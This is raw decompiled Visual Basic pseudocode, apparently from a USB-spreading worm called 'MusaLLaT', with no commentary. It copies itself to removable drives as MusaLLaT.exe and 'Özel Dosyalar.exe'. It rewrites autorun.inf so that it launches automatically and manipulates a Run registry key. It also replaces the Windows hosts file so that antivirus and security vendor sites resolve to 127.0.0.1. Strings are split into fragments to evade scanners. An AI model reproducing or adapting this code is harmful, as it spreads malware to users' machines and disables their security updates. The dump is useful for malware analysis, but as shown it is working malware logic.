  loc_0044237B:   call var_8A2C = global_00401044(".exe", var_8A28)
  loc_00442389:   call var_8A30 = global_004011AC
  loc_00442390:   call var_8A34 = global_00401158(var_8A30)
  loc_004423BB:   call var_8A38 = global_00401150(00000005h, var_A4, var_AC, var_A8, var_B0, var_B4)
  loc_004423D4:   call var_8A3C = global_0040102C(00000002h, var_BC, var_C0)
  loc_004423E4:   var_F8 = "J:\Özel Dosyalar.exe"
  loc_00442404:   call var_8A40 = global_0040118C
  loc_00442413:   call var_8A44 = global_00401120(var_D0, 00000000h)
  loc_00442421:   call var_8A48 = global_004011AC
  loc_0044242D:   call var_8A4C = global_004010B0(global_00418DE4, var_8A48)
  loc_0044243B:   var_118 = var_8A4C
  loc_00442479:   call var_8A50 = global_00401174(var_E0, &H800B, var_40, var_120)
  loc_00442487:   call var_8A54 = global_004010E4(var_F0, var_8A50)
  loc_0044248E:   call var_8A58 = global_00401090(var_8A54)
  loc_004424A1:   call var_8A5C = global_004011CC
  loc_004424B7:   call var_8A60 = global_00401024(00000002h, var_D0, var_120)
  loc_004424C9:   If var_8A58 Then
  loc_004424CB:     GoTo loc_0044276E
  loc_004424D0:   End If
  loc_004424DE:   If global_00460558 = 0 Then
  loc_004424EA:     call var_8A64 = global_00401134(global_00418EE0, global_00460558)
  loc_004424F0:     var_290 = global_00460558
  loc_004424FC:   Else
  loc_00442506:   End If
  loc_0044250E:   var_124 = var_290
  loc_0044252A:   var_BC = var_124.UnkVCall_00000014h
  loc_0044252F:   var_128 = var_BC
  loc_0044253C:   If var_128 < 0 Then
  loc_00442553:     call var_8A68 = global_00401058(var_128, var_124, global_00418ED0, 00000014h)
  loc_00442559:     var_294 = var_8A68
  loc_00442561:   Else
  loc_0044256B:   End If
  loc_00442571:   var_12C = var_BC
  loc_0044258D:   var_A4 = var_12C.UnkVCall_00000050h
  loc_00442592:   var_130 = var_A4
  loc_0044259F:   If var_130 < 0 Then
  loc_004425B6:     call var_8A6C = global_00401058(var_130, var_12C, global_00418EF0, 00000050h)
  loc_004425BC:     var_298 = var_8A6C
  loc_004425C4:   Else
  loc_004425CE:   End If
  loc_004425D5:   If global_00460558 = 0 Then
  loc_004425E1:     call var_8A70 = global_00401134(global_00418EE0, global_00460558)
  loc_004425E7:     var_29C = global_00460558
  loc_004425F3:   Else
  loc_004425FD:   End If
  loc_00442605:   var_134 = var_29C
  loc_00442621:   var_C0 = var_134.UnkVCall_00000014h
  loc_00442626:   var_138 = var_C0
  loc_00442633:   If var_138 < 0 Then
  loc_0044264A:     call var_8A74 = global_00401058(var_138, var_134, global_00418ED0, 00000014h)
  loc_00442650:     var_2A0 = var_8A74
  loc_00442658:   Else
  loc_00442662:   End If
  loc_00442668:   var_13C = var_C0
  loc_00442684:   var_A8 = var_13C.UnkVCall_00000058h
  loc_00442689:   var_140 = var_A8
  loc_00442696:   If var_140 < 0 Then
  loc_004426AD:     call var_8A78 = global_00401058(var_140, var_13C, global_00418EF0, 00000058h)
  loc_004426B3:     var_2A4 = var_8A78
  loc_004426BB:   Else
  loc_004426C5:   End If
  loc_004426D6:   call var_8A7C = global_00401044("\", var_A4, "J:\Özel Dosyalar.exe")
  loc_004426E4:   call var_8A80 = global_004011AC
  loc_004426F2:   call var_8A84 = global_00401044(var_A8, var_8A80)
  loc_00442700:   call var_8A88 = global_004011AC
  loc_0044270C:   call var_8A8C = global_00401044(".exe", var_8A88)
  loc_0044271A:   call var_8A90 = global_004011AC
  loc_00442721:   call var_8A94 = global_00401158(var_8A90)
  loc_0044274C:   call var_8A98 = global_00401150(00000005h, var_A4, var_AC, var_A8, var_B0, var_B4)
  loc_00442765:   call var_8A9C = global_0040102C(00000002h, var_BC, var_C0)
  loc_0044276E:   ' Referenced from: 004424CB
  loc_0044277F:   call var_8AA0 = global_00401044("ut", "J:\a")
  loc_0044278D:   call var_8AA4 = global_004011AC
  loc_00442799:   call var_8AA8 = global_00401044("or", var_8AA4)
  loc_004427A7:   call var_8AAC = global_004011AC
  loc_004427B3:   call var_8AB0 = global_00401044("un.", var_8AAC)
  loc_004427C1:   call var_8AB4 = global_004011AC
  loc_004427CD:   call var_8AB8 = global_00401044(global_004193A4, var_8AB4)
  loc_004427DB:   call var_8ABC = global_004011AC
  loc_004427E7:   call var_8AC0 = global_00401044("nf", var_8ABC)
  loc_004427F5:   call var_8AC4 = global_004011AC
  loc_004427FC:   call var_8AC8 = global_00401110(var_8AC4)
  loc_00442827:   call var_8ACC = global_00401150(00000005h, var_A4, var_A8, var_AC, var_B0, var_B4)
  loc_00442841:   call var_8AD0 = global_00401044("ut", "J:\a")
  loc_0044284F:   call var_8AD4 = global_004011AC
  loc_0044285B:   call var_8AD8 = global_00401044("or", var_8AD4)
  loc_00442869:   call var_8ADC = global_004011AC
  loc_00442875:   call var_8AE0 = global_00401044("un.", var_8ADC)
  loc_00442883:   call var_8AE4 = global_004011AC
  loc_0044288F:   call var_8AE8 = global_00401044(global_004193A4, var_8AE4)
  loc_0044289D:   call var_8AEC = global_004011AC
  loc_004428A9:   call var_8AF0 = global_00401044("nf", var_8AEC)
  loc_004428B7:   call var_8AF4 = global_004011AC
  loc_004428C5:   call var_8AF8 = global_00401188(var_B8, var_8AF4)
  loc_004428CC:   var_8AFC = DeleteFile(var_8AF8)
  loc_004428D1:   call var_8B00 = global_00401054
  loc_00442903:   call var_8B04 = global_00401150(00000006h, var_A4, var_A8, var_AC, var_B0, var_B4, var_B8)
  loc_0044291D:   call var_8B08 = global_00401044("ut", "J:\a")
  loc_0044292B:   call var_8B0C = global_004011AC
  loc_00442937:   call var_8B10 = global_00401044("or", var_8B0C)
  loc_00442945:   call var_8B14 = global_004011AC
  loc_00442951:   call var_8B18 = global_00401044("un.", var_8B14)
  loc_0044295F:   call var_8B1C = global_004011AC
  loc_0044296B:   call var_8B20 = global_00401044(global_004193A4, var_8B1C)
  loc_00442979:   call var_8B24 = global_004011AC
  loc_00442985:   call var_8B28 = global_00401044("nf", var_8B24)
  loc_00442993:   call var_8B2C = global_004011AC
  loc_004429A0:   call var_8B30 = global_0040112C(00000002h, FFFFFFFFh, 00000001h, var_8B2C)
  loc_004429CB:   call var_8B34 = global_00401150(00000005h, var_A4, var_A8, var_AC, var_B0, var_B4)
  loc_004429E7:   call var_8B38 = global_004010F0(global_004194A0, 00000001h, "[AutoRun]")
  loc_00442A03:   call var_8B3C = global_004010F0(global_004194A0, 00000001h, "Open=MusaLLaT.exe")
  loc_00442A1F:   call var_8B40 = global_004010F0(global_004194A0, 00000001h, "Shell\Open=Aç")
  loc_00442A3B:   call var_8B44 = global_004010F0(global_004194A0, 00000001h, "Shell\Open\Command=MusaLLaT.exe")
  loc_00442A4D:   call var_8B48 = global_004010A0(00000001h)
  loc_00442A61:   call var_8B4C = global_004011D0("J:\MusaLLaT.exe", 00000006h)
  loc_00442A7A:   call var_8B50 = global_00401044("ut", "J:\a", 00000006h)
  loc_00442A88:   call var_8B54 = global_004011AC
  loc_00442A94:   call var_8B58 = global_00401044("or", var_8B54)
  loc_00442AA2:   call var_8B5C = global_004011AC
  loc_00442AAE:   call var_8B60 = global_00401044("un.", var_8B5C)
  loc_00442ABC:   call var_8B64 = global_004011AC
  loc_00442AC8:   call var_8B68 = global_00401044(global_004193A4, var_8B64)
  loc_00442AD6:   call var_8B6C = global_004011AC
  loc_00442AE2:   call var_8B70 = global_00401044("nf", var_8B6C)
  loc_00442AF0:   call var_8B74 = global_004011AC
  loc_00442AF7:   call var_8B78 = global_004011D0(var_8B74)
  loc_00442B22:   call var_8B7C = global_00401150(00000005h, var_A4, var_A8, var_AC, var_B0, var_B4)
  loc_00442B4F:   call var_8B80 = global_00401010
  loc_00442B55: End If
  loc_00442B5C: var_F8 = "K:\"
  loc_00442B7C: call var_8B84 = global_0040118C
  loc_00442B8B: call var_8B88 = global_00401120(var_D0, 00000000h)
  loc_00442B99: call var_8B8C = global_004011AC
  loc_00442BA5: call var_8B90 = global_004010B0(global_00418DE4, var_8B8C)
  loc_00442BB3: var_118 = var_8B90
  loc_00442BF1: call var_8B94 = global_00401174(var_E0, &H800B, var_50, var_120)
  loc_00442BFF: call var_8B98 = global_004010E4(var_F0, var_8B94)
  loc_00442C06: call var_8B9C = global_00401090(var_8B98)
  loc_00442C19: call var_8BA0 = global_004011CC
  loc_00442C2F: call var_8BA4 = global_00401024(00000002h, var_D0, var_120)
  loc_00442C41: If var_8B9C Then
  loc_00442C55:   If global_00460558 = 0 Then
  loc_00442C61:     call var_8BA8 = global_00401134(global_00418EE0, global_00460558)
  loc_00442C67:     var_2A8 = global_00460558
  loc_00442C73:   Else
  loc_00442C7D:   End If
  loc_00442C85:   var_124 = var_2A8
  loc_00442CA1:   var_BC = var_124.UnkVCall_00000014h
  loc_00442CA6:   var_128 = var_BC
  loc_00442CB3:   If var_128 < 0 Then
  loc_00442CCA:     call var_8BAC = global_00401058(var_128, var_124, global_00418ED0, 00000014h)
  loc_00442CD0:     var_2AC = var_8BAC
  loc_00442CD8:   Else
  loc_00442CE2:   End If
  loc_00442CE8:   var_12C = var_BC
  loc_00442D04:   var_A4 = var_12C.UnkVCall_00000050h
  loc_00442D09:   var_130 = var_A4
  loc_00442D16:   If var_130 < 0 Then
  loc_00442D2D:     call var_8BB0 = global_00401058(var_130, var_12C, global_00418EF0, 00000050h)
  loc_00442D33:     var_2B0 = var_8BB0
  loc_00442D3B:   Else
  loc_00442D45:   End If
  loc_00442D4C:   If global_00460558 = 0 Then
  loc_00442D58:     call var_8BB4 = global_00401134(global_00418EE0, global_00460558)
  loc_00442D5E:     var_2B4 = global_00460558
  loc_00442D6A:   Else
  loc_00442D74:   End If
  loc_00442D7C:   var_134 = var_2B4
  loc_00442D98:   var_C0 = var_134.UnkVCall_00000014h
  loc_00442D9D:   var_138 = var_C0
  loc_00442DAA:   If var_138 < 0 Then
  loc_00442DC1:     call var_8BB8 = global_00401058(var_138, var_134, global_00418ED0, 00000014h)
  loc_00442DC7:     var_2B8 = var_8BB8
  loc_00442DCF:   Else
  loc_00442DD9:   End If
  loc_00442DDF:   var_13C = var_C0
  loc_00442DFB:   var_A8 = var_13C.UnkVCall_00000058h
  loc_00442E00:   var_140 = var_A8
  loc_00442E0D:   If var_140 < 0 Then
  loc_00442E24:     call var_8BBC = global_00401058(var_140, var_13C, global_00418EF0, 00000058h)
  loc_00442E2A:     var_2BC = var_8BBC
  loc_00442E32:   Else
  loc_00442E3C:   End If
  loc_00442E4D:   call var_8BC0 = global_00401044("\", var_A4, "K:\MusaLLaT.exe")
  loc_00442E5B:   call var_8BC4 = global_004011AC
  loc_00442E69:   call var_8BC8 = global_00401044(var_A8, var_8BC4)
  loc_00442E77:   call var_8BCC = global_004011AC
  loc_00442E83:   call var_8BD0 = global_00401044(".exe", var_8BCC)
  loc_00442E91:   call var_8BD4 = global_004011AC
  loc_00442E98:   call var_8BD8 = global_00401158(var_8BD4)
  loc_00442EC3:   call var_8BDC = global_00401150(00000005h, var_A4, var_AC, var_A8, var_B0, var_B4)
  loc_00442EDC:   call var_8BE0 = global_0040102C(00000002h, var_BC, var_C0)
  loc_00442EEC:   var_F8 = "K:\Özel Dosyalar.exe"
  loc_00442F0C:   call var_8BE4 = global_0040118C
  loc_00442F1B:   call var_8BE8 = global_00401120(var_D0, 00000000h)
  loc_00442F29:   call var_8BEC = global_004011AC
  loc_00442F35:   call var_8BF0 = global_004010B0(global_00418DE4, var_8BEC)
  loc_00442F43:   var_118 = var_8BF0
  loc_00442F81:   call var_8BF4 = global_00401174(var_E0, &H800B, var_50, var_120)
  loc_00442F8F:   call var_8BF8 = global_004010E4(var_F0, var_8BF4)
  loc_00442F96:   call var_8BFC = global_00401090(var_8BF8)
  loc_00442FA9:   call var_8C00 = global_004011CC
  loc_00442FBF:   call var_8C04 = global_00401024(00000002h, var_D0, var_120)
  loc_00442FD1:   If var_8BFC Then
  loc_00442FD3:     GoTo loc_00443276
  loc_00442FD8:   End If
  loc_00442FE6:   If global_00460558 = 0 Then
  loc_00442FF2:     call var_8C08 = global_00401134(global_00418EE0, global_00460558)
  loc_00442FF8:     var_2C0 = global_00460558
  loc_00443004:   Else
  loc_0044300E:   End If
  loc_00443016:   var_124 = var_2C0
  loc_00443032:   var_BC = var_124.UnkVCall_00000014h
  loc_00443037:   var_128 = var_BC
  loc_00443044:   If var_128 < 0 Then
  loc_0044305B:     call var_8C0C = global_00401058(var_128, var_124, global_00418ED0, 00000014h)
  loc_00443061:     var_2C4 = var_8C0C
  loc_00443069:   Else
  loc_00443073:   End If
  loc_00443079:   var_12C = var_BC
  loc_00443095:   var_A4 = var_12C.UnkVCall_00000050h
  loc_0044309A:   var_130 = var_A4
  loc_004430A7:   If var_130 < 0 Then
  loc_004430BE:     call var_8C10 = global_00401058(var_130, var_12C, global_00418EF0, 00000050h)
  loc_004430C4:     var_2C8 = var_8C10
  loc_004430CC:   Else
  loc_004430D6:   End If
  loc_004430DD:   If global_00460558 = 0 Then
  loc_004430E9:     call var_8C14 = global_00401134(global_00418EE0, global_00460558)
  loc_004430EF:     var_2CC = global_00460558
  loc_004430FB:   Else
  loc_00443105:   End If
  loc_0044310D:   var_134 = var_2CC
  loc_00443129:   var_C0 = var_134.UnkVCall_00000014h
  loc_0044312E:   var_138 = var_C0
  loc_0044313B:   If var_138 < 0 Then
  loc_00443152:     call var_8C18 = global_00401058(var_138, var_134, global_00418ED0, 00000014h)
  loc_00443158:     var_2D0 = var_8C18
  loc_00443160:   Else
  loc_0044316A:   End If
  loc_00443170:   var_13C = var_C0
  loc_0044318C:   var_A8 = var_13C.UnkVCall_00000058h
  loc_00443191:   var_140 = var_A8
  loc_0044319E:   If var_140 < 0 Then
  loc_004431B5:     call var_8C1C = global_00401058(var_140, var_13C, global_00418EF0, 00000058h)
  loc_004431BB:     var_2D4 = var_8C1C
  loc_004431C3:   Else
  loc_004431CD:   End If
  loc_004431DE:   call var_8C20 = global_00401044("\", var_A4, "K:\Özel Dosyalar.exe")
  loc_004431EC:   call var_8C24 = global_004011AC
  loc_004431FA:   call var_8C28 = global_00401044(var_A8, var_8C24)
  loc_00443208:   call var_8C2C = global_004011AC
  loc_00443214:   call var_8C30 = global_00401044(".exe", var_8C2C)
  loc_00443222:   call var_8C34 = global_004011AC
  loc_00443229:   call var_8C38 = global_00401158(var_8C34)
  loc_00443254:   call var_8C3C = global_00401150(00000005h, var_A4, var_AC, var_A8, var_B0, var_B4)
  loc_0044326D:   call var_8C40 = global_0040102C(00000002h, var_BC, var_C0)
  loc_00443276:   ' Referenced from: 00442FD3
  loc_00443287:   call var_8C44 = global_00401044("ut", "K:\a")
  loc_00443295:   call var_8C48 = global_004011AC
  loc_004432A1:   call var_8C4C = global_00401044("or", var_8C48)
  loc_004432AF:   call var_8C50 = global_004011AC
  loc_004432BB:   call var_8C54 = global_00401044("un.", var_8C50)
  loc_004432C9:   call var_8C58 = global_004011AC
  loc_004432D5:   call var_8C5C = global_00401044(global_004193A4, var_8C58)
  loc_004432E3:   call var_8C60 = global_004011AC
  loc_004432EF:   call var_8C64 = global_00401044("nf", var_8C60)
  loc_004432FD:   call var_8C68 = global_004011AC
  loc_00443304:   call var_8C6C = global_00401110(var_8C68)
  loc_0044332F:   call var_8C70 = global_00401150(00000005h, var_A4, var_A8, var_AC, var_B0, var_B4)
  loc_00443349:   call var_8C74 = global_00401044("ut", "K:\a")
  loc_00443357:   call var_8C78 = global_004011AC
  loc_00443363:   call var_8C7C = global_00401044("or", var_8C78)
  loc_00443371:   call var_8C80 = global_004011AC
  loc_0044337D:   call var_8C84 = global_00401044("un.", var_8C80)
  loc_0044338B:   call var_8C88 = global_004011AC
  loc_00443397:   call var_8C8C = global_00401044(global_004193A4, var_8C88)
  loc_004433A5:   call var_8C90 = global_004011AC
  loc_004433B1:   call var_8C94 = global_00401044("nf", var_8C90)
  loc_004433BF:   call var_8C98 = global_004011AC
  loc_004433CD:   call var_8C9C = global_00401188(var_B8, var_8C98)
  loc_004433D4:   var_8CA0 = DeleteFile(var_8C9C)
  loc_004433D9:   call var_8CA4 = global_00401054
  loc_0044340B:   call var_8CA8 = global_00401150(00000006h, var_A4, var_A8, var_AC, var_B0, var_B4, var_B8)
  loc_00443425:   call var_8CAC = global_00401044("ut", "K:\a")
  loc_00443433:   call var_8CB0 = global_004011AC
  loc_0044343F:   call var_8CB4 = global_00401044("or", var_8CB0)
  loc_0044344D:   call var_8CB8 = global_004011AC
  loc_00443459:   call var_8CBC = global_00401044("un.", var_8CB8)
  loc_00443467:   call var_8CC0 = global_004011AC
  loc_00443473:   call var_8CC4 = global_00401044(global_004193A4, var_8CC0)
  loc_00443481:   call var_8CC8 = global_004011AC
  loc_0044348D:   call var_8CCC = global_00401044("nf", var_8CC8)
  loc_0044349B:   call var_8CD0 = global_004011AC
  loc_004434A8:   call var_8CD4 = global_0040112C(00000002h, FFFFFFFFh, 00000001h, var_8CD0)
  loc_004434D3:   call var_8CD8 = global_00401150(00000005h, var_A4, var_A8, var_AC, var_B0, var_B4)
  loc_004434EF:   call var_8CDC = global_004010F0(global_004194A0, 00000001h, "[AutoRun]")
  loc_0044350B:   call var_8CE0 = global_004010F0(global_004194A0, 00000001h, "Open=MusaLLaT.exe")
  loc_00443527:   call var_8CE4 = global_004010F0(global_004194A0, 00000001h, "Shell\Open=Aç")
  loc_00443543:   call var_8CE8 = global_004010F0(global_004194A0, 00000001h, "Shell\Open\Command=MusaLLaT.exe")
  loc_00443555:   call var_8CEC = global_004010A0(00000001h)
  loc_00443569:   call var_8CF0 = global_004011D0("K:\MusaLLaT.exe", 00000006h)
  loc_00443582:   call var_8CF4 = global_00401044("ut", "K:\a", 00000006h)
  loc_00443590:   call var_8CF8 = global_004011AC
  loc_0044359C:   call var_8CFC = global_00401044("or", var_8CF8)
  loc_004435AA:   call var_8D00 = global_004011AC
  loc_004435B6:   call var_8D04 = global_00401044("un.", var_8D00)
  loc_004435C4:   call var_8D08 = global_004011AC
  loc_004435D0:   call var_8D0C = global_00401044(global_004193A4, var_8D08)
  loc_004435DE:   call var_8D10 = global_004011AC
  loc_004435EA:   call var_8D14 = global_00401044("nf", var_8D10)
  loc_004435F8:   call var_8D18 = global_004011AC
  loc_004435FF:   call var_8D1C = global_004011D0(var_8D18)
  loc_0044362A:   call var_8D20 = global_00401150(00000005h, var_A4, var_A8, var_AC, var_B0, var_B4)
  loc_00443657:   call var_8D24 = global_00401010
  loc_0044365D: End If
  loc_00443669: GoTo loc_004436DA
  loc_00443697: call var_8D28 = global_00401150(00000006h, var_A4, var_A8, var_AC, var_B0, var_B4, var_B8, global_00443729)
  loc_004436B0: call var_8D2C = global_0040102C(00000002h, var_BC, var_C0)
  loc_004436D0: call var_8D30 = global_00401024(00000003h, var_D0, var_E0, var_F0)
  loc_004436D9: Exit Sub
  loc_004436DA: ' Referenced from: 00443669
  loc_004436DD: call var_8D34 = global_00401014
  loc_004436E6: call var_8D38 = global_00401014
  loc_004436EF: call var_8D3C = global_00401014
  loc_004436F8: call var_8D40 = global_00401014
  loc_00443701: call var_8D44 = global_00401014
  loc_0044370A: call var_8D48 = global_00401014
  loc_00443716: call var_8D4C = global_00401014
  loc_00443722: call var_8D50 = global_00401014
End Sub

Private Sub Timer4_Timer() '4492B0
  loc_004492B6: ext_4010EC
  loc_004492CE: ext_40109C
  loc_00449315: call var_8004 = global_00401070(FFFFFFFFh, Me, 0, 0, 0)
  loc_00449330: call var_8008 = global_00401108(var_84, "Wscript.Shell", 00000000h)
  loc_00449341: call var_800C = global_0040116C(var_30, var_84)
  loc_00449358: call var_8010 = global_00401044("Y_CU", "HKE")
  loc_00449363: call var_8014 = global_004011AC
  loc_0044936F: call var_8018 = global_00401044("RREN", var_8014)
  loc_0044937A: call var_801C = global_004011AC
  loc_00449386: call var_8020 = global_00401044("T_US", var_801C)
  loc_00449391: call var_8024 = global_004011AC
  loc_0044939D: call var_8028 = global_00401044("ER\SO", var_8024)
  loc_004493A8: call var_802C = global_004011AC
  loc_004493B4: call var_8030 = global_00401044("FTW", var_802C)
  loc_004493BF: call var_8034 = global_004011AC
  loc_004493CB: call var_8038 = global_00401044("ARE", var_8034)
  loc_004493D6: call var_803C = global_004011AC
  loc_004493E2: call var_8040 = global_00401044("\Mi", var_803C)
  loc_004493ED: call var_8044 = global_004011AC
  loc_004493F9: call var_8048 = global_00401044("cro", var_8044)
  loc_00449404: call var_804C = global_004011AC
  loc_00449410: call var_8050 = global_00401044("soft", var_804C)
  loc_0044941B: call var_8054 = global_004011AC
  loc_00449427: call var_8058 = global_00401044("\Wi", var_8054)
  loc_00449432: call var_805C = global_004011AC
  loc_0044943E: call var_8060 = global_00401044("ndo", var_805C)
  loc_00449449: call var_8064 = global_004011AC
  loc_00449455: call var_8068 = global_00401044("ws\Cu", var_8064)
  loc_00449460: call var_806C = global_004011AC
  loc_0044946C: call var_8070 = global_00401044("rren", var_806C)
  loc_00449477: call var_8074 = global_004011AC
  loc_00449483: call var_8078 = global_00401044("tVer", var_8074)
  loc_0044948E: call var_807C = global_004011AC
  loc_0044949A: call var_8080 = global_00401044("sion\R", var_807C)
  loc_004494A5: call var_8084 = global_004011AC
  loc_004494B1: call var_8088 = global_00401044("un\M", var_8084)
  loc_004494BC: call var_808C = global_004011AC
  loc_004494C8: call var_8090 = global_00401044("usa", var_808C)
  loc_004494D3: call var_8094 = global_004011AC
  loc_004494DF: call var_8098 = global_00401044("LLaT", var_8094)
  loc_004494E5: var_7C = var_8098
  loc_004494F7: ext_40109C
  loc_00449523: call var_809C = global_004010C0(var_30, "RegDelete", 00000001h, 8)
  loc_0044952A: call var_80A0 = global_00401184
  loc_00449579: call var_80A4 = global_00401150(00000011h, var_34, var_38, var_3C, var_40, var_44, var_48, var_4C, var_50, var_54, var_58, var_5C, var_60, var_64, var_68, var_6C)
  loc_00449588: call var_80A8 = global_00401014
  loc_0044959A: GoTo loc_004495F8
  loc_004495E2: call var_80AC = global_00401150(00000011h, var_34, var_38, var_3C, var_40, var_44, var_48, var_4C, var_50, var_54, var_58, var_5C, var_60, var_64, var_68, var_6C)
  loc_004495F1: call var_80B0 = global_00401014
  loc_004495F7: Exit Sub
  loc_004495F8: ' Referenced from: 0044959A
  loc_004495FB: call var_80B4 = global_00401014
End Sub

Private Sub Timer2_Timer() '445040
  loc_00445046: ext_4010EC
  loc_0044505E: ext_40109C
  loc_004450A5: call var_8004 = global_00401070(FFFFFFFFh, Me, 0, 0, 0)
  loc_004450BC: call var_8008 = global_00401044("IND", "C:\W")
  loc_004450C7: call var_800C = global_004011AC
  loc_004450D3: call var_8010 = global_00401044("OWS\sy", var_800C)
  loc_004450DE: call var_8014 = global_004011AC
  loc_004450EA: call var_8018 = global_00401044("ste", var_8014)
  loc_004450F5: call var_801C = global_004011AC
  loc_00445101: call var_8020 = global_00401044("m32\dr", var_801C)
  loc_0044510C: call var_8024 = global_004011AC
  loc_00445118: call var_8028 = global_00401044("ivers\e", var_8024)
  loc_00445123: call var_802C = global_004011AC
  loc_0044512F: call var_8030 = global_00401044("tc\h", var_802C)
  loc_0044513A: call var_8034 = global_004011AC
  loc_00445146: call var_8038 = global_00401044("os", var_8034)
  loc_00445151: call var_803C = global_004011AC
  loc_0044515D: call var_8040 = global_00401044("ts", var_803C)
  loc_00445168: call var_8044 = global_004011AC
  loc_00445173: call var_8048 = global_00401188(var_44, var_8044)
  loc_0044517A: var_804C = DeleteFile(var_8048)
  loc_0044517F: call var_8050 = global_00401054
  loc_004451AB: call var_8054 = global_00401150(00000009h, var_24, var_28, var_2C, var_30, var_34, var_38, var_3C, var_40, var_44)
  loc_004451C5: call var_8058 = global_00401044("IND", "C:\W")
  loc_004451D0: call var_805C = global_004011AC
  loc_004451DC: call var_8060 = global_00401044("OWS\sy", var_805C)
  loc_004451E7: call var_8064 = global_004011AC
  loc_004451F3: call var_8068 = global_00401044("ste", var_8064)
  loc_004451FE: call var_806C = global_004011AC
  loc_0044520A: call var_8070 = global_00401044("m32\dr", var_806C)
  loc_00445215: call var_8074 = global_004011AC
  loc_00445221: call var_8078 = global_00401044("ivers\e", var_8074)
  loc_0044522C: call var_807C = global_004011AC
  loc_00445238: call var_8080 = global_00401044("tc\h", var_807C)
  loc_00445243: call var_8084 = global_004011AC
  loc_0044524F: call var_8088 = global_00401044("os", var_8084)
  loc_0044525A: call var_808C = global_004011AC
  loc_00445266: call var_8090 = global_00401044("ts", var_808C)
  loc_00445271: call var_8094 = global_004011AC
  loc_0044527E: call var_8098 = global_0040112C(00000002h, FFFFFFFFh, 00000001h, var_8094)
  loc_004452A6: call var_809C = global_00401150(00000008h, var_24, var_28, var_2C, var_30, var_34, var_38, var_3C, var_40)
  loc_004452C0: call var_80A0 = global_00401044("eat", "127.0.0.1  thr")
  loc_004452CB: call var_80A4 = global_004011AC
  loc_004452D7: call var_80A8 = global_00401044("se", var_80A4)
  loc_004452E2: call var_80AC = global_004011AC
  loc_004452EE: call var_80B0 = global_00401044("nse.net", var_80AC)
  loc_004452F9: call var_80B4 = global_004011AC
  loc_00445307: call var_80B8 = global_004010F0(global_004194A0, 00000001h, var_80B4)
  loc_0044531E: call var_80BC = global_00401150(00000003h, var_24, var_28, var_2C)
  loc_00445338: call var_80C0 = global_00401044("hre", "127.0.0.1  www.t")
  loc_00445343: call var_80C4 = global_004011AC
  loc_0044534F: call var_80C8 = global_00401044("atse", var_80C4)
  loc_0044535A: call var_80CC = global_004011AC
  loc_00445366: call var_80D0 = global_00401044("n", var_80CC)
  loc_00445371: call var_80D4 = global_004011AC
  loc_0044537D: call var_80D8 = global_00401044("se.net", var_80D4)
  loc_00445388: call var_80DC = global_004011AC
  loc_00445396: call var_80E0 = global_004010F0(global_004194A0, 00000001h, var_80DC)
  loc_004453B1: call var_80E4 = global_00401150(00000004h, var_24, var_28, var_2C, var_30)
  loc_004453CB: call var_80E8 = global_00401044("a.co", "127.0.0.1  www.zm")
  loc_004453D6: call var_80EC = global_004011AC
  loc_004453E2: call var_80F0 = global_00401044("m.ar", var_80EC)
  loc_004453ED: call var_80F4 = global_004011AC
  loc_004453FB: call var_80F8 = global_004010F0(global_004194A0, 00000001h, var_80F4)
  loc_0044540E: call var_80FC = global_00401150(00000002h, var_24, var_28)
  loc_00445428: call var_8100 = global_00401044("a.c", "127.0.0.1  zm")
  loc_00445433: call var_8104 = global_004011AC
  loc_0044543F: call var_8108 = global_00401044("om.ar", var_8104)
  loc_0044544A: call var_810C = global_004011AC
  loc_00445458: call var_8110 = global_004010F0(global_004194A0, 00000001h, var_810C)
  loc_0044546B: call var_8114 = global_00401150(00000002h, var_24, var_28)
  loc_00445485: call var_8118 = global_00401044("ore.ca.com", "127.0.0.1  st")
  loc_00445490: call var_811C = global_004011AC
  loc_0044549E: call var_8120 = global_004010F0(global_004194A0, 00000001h, var_811C)
  loc_004454AA: call var_8124 = global_004011CC
  loc_004454C1: call var_8128 = global_00401044(global_00419A98, "127.0.0.1  a")
  loc_004454CC: call var_812C = global_004011AC
  loc_004454D8: call var_8130 = global_00401044("ira.com", var_812C)
  loc_004454E3: call var_8134 = global_004011AC
  loc_004454F1: call var_8138 = global_004010F0(global_004194A0, 00000001h, var_8134)
  loc_00445504: call var_813C = global_00401150(00000002h, var_24, var_28)
  loc_0044551E: call var_8140 = global_00401044("tiv", "127.0.0.1  www.an")
  loc_00445529: call var_8144 = global_004011AC
  loc_00445535: call var_8148 = global_00401044("ir.com", var_8144)
  loc_00445540: call var_814C = global_004011AC
  loc_0044554E: call var_8150 = global_004010F0(global_004194A0, 00000001h, var_814C)
  loc_00445561: call var_8154 = global_00401150(00000002h, var_24, var_28)
  loc_0044557B: call var_8158 = global_00401044("tiv", "127.0.0.1  an")
  loc_00445586: call var_815C = global_004011AC
  loc_00445592: call var_8160 = global_00401044("ir.com", var_815C)
  loc_0044559D: call var_8164 = global_004011AC
  loc_004455AB: call var_8168 = global_004010F0(global_004194A0, 00000001h, var_8164)
  loc_004455BE: call var_816C = global_00401150(00000002h, var_24, var_28)
  loc_004455D8: call var_8170 = global_00401044("ti", "127.0.0.1  www.an")
  loc_004455E3: call var_8174 = global_004011AC
  loc_004455EF: call var_8178 = global_00401044(global_00419A98, var_8174)
  loc_004455FA: call var_817C = global_004011AC
  loc_00445606: call var_8180 = global_00401044("ir.com.tr", var_817C)
  loc_00445611: call var_8184 = global_004011AC
  loc_0044561F: call var_8188 = global_004010F0(global_004194A0, 00000001h, var_8184)
  loc_00445636: call var_818C = global_00401150(00000003h, var_24, var_28, var_2C)
  loc_00445650: call var_8190 = global_00401044("vg.com", "127.0.0.1  www.a")
  loc_0044565B: call var_8194 = global_004011AC
  loc_00445669: call var_8198 = global_004010F0(global_004194A0, 00000001h, var_8194)
  loc_00445675: call var_819C = global_004011CC
  loc_0044568C: call var_81A0 = global_00401044("vg.com", "127.0.0.1  a")
  loc_00445697: call var_81A4 = global_004011AC
  loc_004456A5: call var_81A8 = global_004010F0(global_004194A0, 00000001h, var_81A4)
  loc_004456B1: call var_81AC = global_004011CC
  loc_004456C8: call var_81B0 = global_00401044(global_00419238, "127.0.0.1  www.sc")
  loc_004456D3: call var_81B4 = global_004011AC
  loc_004456DF: call var_81B8 = global_00401044("nwi", var_81B4)
  loc_004456EA: call var_81BC = global_004011AC
  loc_004456F6: call var_81C0 = global_00401044("th.com", var_81BC)
  loc_00445701: call var_81C4 = global_004011AC
  loc_0044570F: call var_81C8 = global_004010F0(global_004194A0, 00000001h, var_81C4)
  loc_00445726: call var_81CC = global_00401150(00000003h, var_24, var_28, var_2C)
  loc_00445740: call var_81D0 = global_00401044("anwith.com", "127.0.0.1  sc")
  loc_0044574B: call var_81D4 = global_004011AC
